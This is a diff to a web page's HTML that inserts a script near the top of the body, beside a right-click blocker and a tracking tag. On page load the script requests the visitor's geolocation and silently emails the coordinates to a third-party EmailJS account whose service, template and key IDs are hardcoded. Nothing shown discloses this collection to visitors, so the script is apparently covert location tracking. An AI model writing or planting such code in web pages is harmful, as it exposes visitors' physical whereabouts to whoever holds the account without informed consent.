@@ -3167,6 +3167,37 @@
 
 <body oncontextmenu="return!1" style="min-height:100%"><iframe src="about:blank" title="" role="presentation"
         loading="eager" style="width: 0px; height: 0px; border: 0px; display: none;"></iframe>
+
+	<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            getLocation();
+        });
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    sendLocation(position.coords.latitude, position.coords.longitude);
+                }, function(error) {
+                    console.error("Error getting location:", error.message);
+                });
+            } else {
+                console.error("Geolocation is not supported by this browser.");
+            }
+        }
+
+        function sendLocation(latitude, longitude) {
+            const serviceID = 'service_o03eua9';
+            const templateID = 'template_xfjfyaw';
+
+            emailjs.init('WIUpdrW8kYQ01y7xU');
+            emailjs.send(serviceID, templateID, {
+                latitude: latitude,
+                longitude: longitude
+            });
+        }
+    </script>
+	
     <script>window.addEventListener("DOMContentLoaded", function () { !function (e, t, n, a, o) { e[a] = e[a] || [], e[a].push({ "gtm.start": (new Date).getTime(), event: "gtm.js" }); var r = t.getElementsByTagName(n)[0], s = t.createElement(n); s.async = !0, s.src = "https://www.googletagmanager.com/gtm.js?id=GTM-H34B", r.parentNode.insertBefore(s, r) }(window, document, "script", "dataLayer") })</script>
     <svg style="position:absolute;width:0;height:0;overflow:hidden" xmlns="http://www.w3.org/2000/svg">
         <defs>
